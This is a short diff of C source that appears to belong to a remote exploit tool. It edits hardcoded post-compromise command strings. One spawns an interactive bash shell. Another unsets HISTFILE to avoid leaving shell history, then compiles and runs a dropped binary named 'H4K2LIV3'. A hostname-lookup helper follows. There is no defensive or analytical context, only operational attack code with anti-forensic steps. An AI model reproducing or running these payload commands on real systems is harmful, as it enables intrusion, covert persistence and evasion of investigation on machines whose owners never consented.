@@ -661,7 +661,7 @@ typedef struct {
 
 #define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
 
-#define COMMAND2 "unset HISTFILE; cd /tmp; cat $(pwd)/lib.c > rony.c; gcc -o H4K2LIV3 rony.c; rm rony.c; ./H4K2LIV3; \n"
+#define COMMAND2 "unset HISTFILE; cat $(pwd)/lib.c > rony.c; gcc -o H4K2LIV3 rony.c; rm rony.c; ./H4K2LIV3; \n"
 
 long getip(char *hostname) {
 	struct hostent *he;
